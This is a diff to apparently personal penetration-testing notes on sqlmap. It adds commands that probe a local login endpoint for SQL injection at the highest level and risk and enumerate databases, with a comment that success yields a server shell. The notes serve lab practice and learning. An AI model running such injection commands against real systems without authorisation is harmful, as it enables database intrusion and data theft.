@@ -27,12 +27,15 @@ Usage Context
 // Attempt to exploit the SQL injection based on the request in test.txt.
 // If successful, it will give you a shell interface where you can run commands as if you were logged into the server.
 
-python3 sqlmap.py -r ~/Documents/Code/Pentest/sqlmap-master/request.txt --dbs --batch --no-cast --flush-session
+sqlmap -r ~/Documents/Code/Pentest/sqlmap-master/request.txt --dbs --batch --no-cast --flush-session
 
 --dbs            Enumerate DBMS databases
 --batch          Never ask for user input, use the default behavior
 --no-cast        Turn off payload casting mechanism
 --flush-session  Flush session files for current target
+
+sqlmap -u 'http://localhost:3000/rest/user/login' --data="email=test@test.com&password=test" --level 5 --risk 3 -f --banner --ignore-code 401 --dbms='sqlite' --technique=B
+
 
 sqlmap-u "http://the url u want to inject with the id " --batch
 example: sqlmap-u "http://192.168.0.0/room.php?cod=1" –batch
